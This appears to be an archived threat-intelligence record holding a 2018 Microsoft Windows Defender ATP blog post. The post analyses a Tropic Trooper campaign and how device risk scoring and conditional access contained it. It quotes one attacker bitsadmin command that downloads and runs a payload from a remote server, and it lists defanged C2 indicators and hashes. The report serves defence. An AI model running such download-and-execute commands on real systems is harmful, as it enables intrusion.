{
    "id": "628c24ff-2645-44a1-bc96-b30940131ab3",
    "created_at": "2022-10-25T16:48:15.113325Z",
    "updated_at": "2025-03-27T02:16:04.360416Z",
    "deleted_at": null,
    "sha1_hash": "35e08265a41e32c77ebe08160d03ce089538a540",
    "title": "Windows Defender ATP device risk score exposes new cyberattack, drives Conditional access to protect networks",
    "authors": "",
    "file_creation_date": "2018-12-04T07:17:13Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 290146,
    "plain_text": "# Windows Defender ATP device risk score exposes new cyberattack, drives Conditional access to protect networks\n\n**[cloudblogs.microsoft.com/microsoftsecure/2018/11/28/windows-defender-atp-device-risk-score-exposes-new-](https://cloudblogs.microsoft.com/microsoftsecure/2018/11/28/windows-defender-atp-device-risk-score-exposes-new-cyberattack-drives-conditional-access-to-protect-networks/)**\ncyberattack-drives-conditional-access-to-protect-networks/\n\nWindows Defender ATP team November 28, 2018\n\nSeveral weeks ago, the Windows Defender Advanced Threat\n[Protection (Windows Defender ATP) team uncovered a new](https://www.microsoft.com/en-us/windowsforbusiness/windows-atp?ocid=cx-blog-mmpc)\ncyberattack that targeted several high-profile organizations in the\nenergy and food and beverage sectors in Asia. Given the target\nregion and verticals, the attack chain, and the toolsets used, we\nbelieve the threat actor that the industry refers to as Tropic\nTrooper was likely behind the attack.\n\nThe attack set off numerous Windows Defender ATP alerts and\ntriggered the device risk calculation mechanism, which labeled the affected machines with\nthe highest risk. The high device risk score put the affected machines at the top of the list\nin Windows Defender Security Center, which led to the early detection and discovery of the\nattack.\n\nWith the high risk determined for affected machines, [Conditional access blocked these](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-atp/conditional-access-windows-defender-advanced-threat-protection)\nmachines’ access to sensitive content, protecting other users, devices, and data in the\nnetwork. IT admins can control access with Conditional access based on the device risk\nscore to ensure that only secure devices have access to enterprise resources.\n\nFinally, automatic investigation and remediation kicked in, discovered the artifacts on\naffected machines that were related to the breach, and remediated the threat. This\nsequence of actions ensured that the attackers no longer had foothold on affected\nmachines, returning machines to normal working state. Once the threat was remediated,\nthe risk score for those machines was reduced and Conditional access restrictions were\nlifted.\n\n## Investigating alert timelines and process trees\n\nWe discovered the attack when Windows Defender ATP called our attention to alerts\nflagging several different suspicious activities like abnormal Office applications activity,\ndubious cross-process injections, and machine-learning-based indications of anomalous\nexecutions flows. The sheer volume and variety of the alerts told us something serious was\ngoing on.\n\n\n-----\n\n_Figure 1. Multiple alerts triggered by the attack_\n\nThe first detection related to the attack was fired by a suspicious _EQNEDT32.exe behavior,_\nwhich led us to the entry vector of the attack: a malicious document that carried an exploit\nfor CVE-2018-0802, a vulnerability in Microsoft Office Equation Editor, which the actor\n[known as Tropic Trooper has exploited in previous campaigns. Using Office 365 ATP](https://products.office.com/en-us/exchange/online-email-threat-protection?ocid=cx-blog-mmpc)\nThreat Explorer, we found the specific emails that the attackers used to distribute the\nmalicious document.\n\nUsing Windows Defender Security Center, we further investigated the detected executable\nand found that the attackers used bitsadmin.exe to download and execute a randomly\nnamed payload from a remote server:\n\nbitsadmin /transfer Cd /priority foreground http:/<IP address>:4560/.exe\n%USERPROFILE%\\fY.exe && start %USERPROFILE%\\fY.exe\n\nMachine timeline activity showed that the executed payload communicated to a remote\n[command-and-control (C&C) server and used the process hollowing technique to run code](https://cloudblogs.microsoft.com/microsoftsecure/2017/07/12/detecting-stealthier-cross-process-injection-techniques-with-windows-defender-atp-process-hollowing-and-atom-bombing/)\nin a system process memory.\n\nIn some cases, the attacker ran additional activities using malicious PowerShell scripts.\n[Windows Defender ATP’s Antimalware Scan Interface (AMSI) sensor exposed all the](https://docs.microsoft.com/en-us/windows/desktop/amsi/antimalware-scan-interface-portal)\nattacker scripts, which we observed to be meant mostly for data exfiltration.\n\n\n-----\n\nUsing the timeline and process tree views in Windows Defender Security Center, were able\nto identity the processes exhibiting malicious activities and pinpoint exactly when they\noccurred, allowing us to reconstruct the attack chain. As a result of this analysis, we were\nable to determine a strong similarity between this new attack and the attack patterns used\nby the threat actor known as Tropic Trooper.\n\n_Figure 3. Campaign attack chain_\n\n## Device risk calculation and incident prioritization\n\nThe alerts that were raised for this attack resulted in a high device risk score for affected\nmachines. Windows Defender ATP determines a device risk score based on different\nmechanisms. The score is meant to raise the risk level of machines with true positive alerts\nthat indicate a potential targeted attack. The high device risk score pushed the affected\nmachines to the top of the queue, helping ensure security operations teams can\nimmediately notice and prioritize. More importantly, elevated device risk scores trigger\nautomatic investigation and response, helping contain attacks early in its lifespan.\n\nIn this specific attack, the risk calculation mechanism gave the affected machines the\nhighest risk based on cumulative risk. Cumulative risk is calculated based on the multiple\ncomponent and multiple types of anomalous behaviors exhibited by an attack across the\ninfection chain.\n\n## Windows Defender ATP-driven conditional access\n\nWhen Windows Defender ATP raises the device risk score for machines, as in this attack,\nthe affected devices are marked as being at high risk. This risk score is immediately\n\n\n-----\n\nThis integration between Windows Defender ATP and Azure Active Directory through\nMicrosoft Intune ensures that attackers are immediately prevented from gaining access to\nsensitive corporate data, even if attackers manage to establish a foothold on networks.\nWhen the threat is remediated, Windows Defender ATP drops the device risk score, and the\n[device regains access to resources. Read more about Conditional access here.](https://techcommunity.microsoft.com/t5/What-s-New/Conditional-access-Ensuring-that-only-secure-users-and-devices/ba-p/292510)\n\n## Signal sharing and threat remediation across Microsoft Threat Protection\n\nThreat signal sharing across Microsoft services through the [Intelligent Security Graph](https://cloudblogs.microsoft.com/microsoftsecure/2017/07/18/windows-defender-antivirus-cloud-protection-service-advanced-real-time-defense-against-never-before-seen-malware/)\n[ensures that threat remediation is orchestrated across Microsoft Threat Protection. In this](https://techcommunity.microsoft.com/t5/Security-Privacy-and-Compliance/Announcing-Microsoft-Threat-Protection/ba-p/262783)\ncase, Office 365 ATP blocked the related email and malicious document used in the initial\nstages of the attack. Office 365 ATP had determined the malicious nature of the emails\nand attachment at the onset, stopping the attack’s entry point and protecting Office 365\nATP customers from the attack.\n\nThis threat signal is shared with Windows Defender ATP, adding to the rich threat\nintelligence that was used for investigation. Likewise, Office 365 ATP consumes\nintelligence from Windows Defender ATP, helping make sure that malicious attachments\nare detected and related emails are blocked.\n\nMeanwhile, as mentioned, the integration of Windows Defender ATP and Azure Active\nDirectory ensured that affected devices are not allowed to access sensitive corporate data\nuntil the threat is resolved.\nWindows Defender ATP, Office 365 ATP, and Azure Active Directory are just someof the\nmany Microsoft services now integrate through Microsoft Threat Protection, an integrated\nsolution for securing identities, endpoints, user data, cloud apps, and infrastructure.\n\n## Conclusion\n\nThe new device risk calculation mechanism in [Windows Defender ATP raised the priority of](https://www.microsoft.com/en-us/windowsforbusiness/windows-atp?ocid=cx-blog-mmpc)\nvarious alerts that turned out to be related to a targeted attack, exposing the threat and\nallowing security operations teams to immediately take remediation actions. Additionally,\nthe elevated device risk score triggered automated investigation and response, mitigating\nthe attack at its early stages.\n\n[Through Conditional access, compromised machines are blocked from accessing critical](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-atp/conditional-access-windows-defender-advanced-threat-protection)\ncorporate assets. This protects organizations from the serious risk of attackers leveraging\ncompromised devices to perform cyberespionage and other types of attacks.\n\nTo test how these and other advanced capabilities in Windows Defender ATP can help your\norganization detect, investigate, and respond to attacks, **[sign up for a free trial](https://www.microsoft.com/en-us/windowsforbusiness/windows-atp?ocid=cx-blog-mmpc)** .\n\n**_Hadar Feldman and Yarden Albeck_**\n_Windows Defender ATP team_\n\n\n-----\n\n### Command and control IP addresses and URLs:\n\n199[.]192[.]23[.]231\n45[.]122[.]138 [.]6\nlovehaytyuio09[.]com\n\n### Files (SHA-256):\n\n9adfc863501b4c502fdac0d97e654541c7355316f1d1663b26a9aaa5b5e722d6 (size:\n190696 bytes, type: PE)\n5589544be7f826df87f69a84abf478474b6eef79b48b914545136290fee840fe (size:\n727552, type: PE)\n073884caf7df8dafc225567f9065bbf9bf8e5beef923655d45fe5b63c6b6018c (size:\n195123 bytes, type: docx)\n1aef46dcbf9f0b5ff548f492685d488c7ac514a24e63a4d3ed119bfdbd39c908 (size:\n207444, type: docx)\n\n#### Talk to us\n\nQuestions, concerns, or insights on this story? Join discussions at the Microsoft\n[community and Windows Defender Security Intelligence.](https://www.microsoft.com/en-us/wdsi)\n\nFollow us on Twitter [@WDSecurity and Facebook Windows Defender Security Intelligence.](https://twitter.com/WDSecurity)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.11.28.Tropic_Trooper_microsoft/Tropic_Trooper_microsoft.pdf"
    ],
    "report_names": [
        "Tropic_Trooper_microsoft"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f74e4fe6-6281-45e7-8866-0ff4316381cc",
            "created_at": "2024-05-01T02:03:07.959101Z",
            "updated_at": "2025-03-27T02:05:17.270819Z",
            "deleted_at": null,
            "main_name": "BRONZE HOBART",
            "aliases": [
                "Pirate Panda ",
                "Tropic Trooper ",
                "KeyBoy "
            ],
            "source_name": "Secureworks:BRONZE HOBART",
            "tools": [
                " KeyBoy",
                " Pfine",
                "DSNGInstaller"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "61ea51ed-a419-4b05-9241-5ab0dbba25fc",
            "created_at": "2023-01-06T13:46:38.354607Z",
            "updated_at": "2025-03-27T02:00:02.81258Z",
            "deleted_at": null,
            "main_name": "APT23",
            "aliases": [
                "KeyBoy",
                "Tropic Trooper",
                "BRONZE HOBART",
                "G0081",
                "Red Orthrus",
                "Earth Centaur",
                "PIRATE PANDA"
            ],
            "source_name": "MISPGALAXY:APT23",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bef7800a-a08f-4e21-b65c-4279c851e572",
            "created_at": "2022-10-25T15:50:23.409336Z",
            "updated_at": "2025-03-27T02:00:55.463048Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "Tropic Trooper",
                "Pirate Panda",
                "KeyBoy"
            ],
            "source_name": "MITRE:Tropic Trooper",
            "tools": [
                "USBferry",
                "ShadowPad",
                "PoisonIvy",
                "BITSAdmin",
                "YAHOYAH",
                "KeyBoy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "578f8e62-2bb4-4ce4-a8b7-6c868fa29724",
            "created_at": "2022-10-25T16:07:24.344358Z",
            "updated_at": "2025-03-27T02:02:10.182282Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "APT 23",
                "Bronze Hobart",
                "Earth Centaur",
                "KeyBoy",
                "Operation Tropic Trooper",
                "Pirate Panda",
                "Tropic Trooper"
            ],
            "source_name": "ETDA:Tropic Trooper",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "ByPassGodzilla",
                "CHINACHOPPER",
                "CREDRIVER",
                "China Chopper",
                "Chymine",
                "Darkmoon",
                "Gen:Trojan.Heur.PT",
                "KeyBoy",
                "Neo-reGeorg",
                "PCShare",
                "POISONPLUG.SHADOW",
                "Poison Ivy",
                "RoyalRoad",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Swor",
                "TSSL",
                "USBferry",
                "W32/Seeav",
                "Winsloader",
                "XShellGhost",
                "Yahoyah",
                "fscan",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041764,
    "ts_creation_date": 1543907833,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/35e08265a41e32c77ebe08160d03ce089538a540.pdf",
        "text": "https://archive.orkl.eu/35e08265a41e32c77ebe08160d03ce089538a540.txt",
        "img": "https://archive.orkl.eu/35e08265a41e32c77ebe08160d03ce089538a540.jpg"
    }
}